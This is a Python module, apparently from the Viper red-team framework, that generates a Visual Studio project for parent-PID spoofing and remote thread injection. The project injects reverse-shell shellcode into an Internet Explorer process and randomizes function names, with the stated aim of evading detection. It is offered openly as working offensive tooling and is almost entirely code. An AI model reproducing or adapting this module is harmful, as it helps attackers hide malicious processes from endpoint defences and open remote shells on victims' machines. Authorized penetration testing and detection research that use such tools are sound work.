# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "伪装PPID规避检测"
    DESC_ZH = "使用CreateProcessA及远程线程注入技术伪装PPID,将shellcode注入到ie进程中"

    NAME_EN = "Disguise PPID to evade detection"
    DESC_EN = "Use CreateProcessA and remote thread injection technology to disguise PPID and inject shellcode into the ie process"

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/do11qd"]
    REFERENCES = ["https://pentestlab.blog/2020/02/24/parent-pid-spoofing/"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        FUNCTION = self.random_str(8)
        FUNCTION1 = self.random_str(9)
        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode, FUNCTION=FUNCTION,
                                                        FUNCTION1=FUNCTION1)

        filename = f"FakePPID_{int(time.time())}.zip"
        self.write_zip_vs_project(filename, source_code, )

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的源码: {filename}", f"Please check the generated source code in <Files>: {filename}")
